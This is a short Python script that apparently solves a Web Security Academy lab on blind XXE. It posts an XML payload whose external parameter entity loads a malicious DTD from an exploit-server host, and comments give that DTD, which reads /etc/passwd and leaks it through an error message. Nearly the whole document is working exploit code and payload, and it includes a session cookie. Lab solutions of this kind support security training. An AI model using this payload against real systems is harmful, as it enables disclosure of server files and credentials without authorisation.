# Exploiting blind XXE to retrieve data via error messages

import requests

url = "https://0af5000203ed0b83c0be3bc500a400ae.web-security-academy.net/product/stock"

cookies = {
	"session": "B4outOeus5y9mnmsvbi0l7N6vxEiaGez"
}

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY % xxe SYSTEM "https://exploit-0ab3005b039c0bbec0f03b1101450067.exploit-server.net/exploit">
%xxe;
]>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>"""


r = requests.post(url, data=payload, cookies=cookies)

print(r.text)

# In the exploit server body
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
# %eval;
# %error;
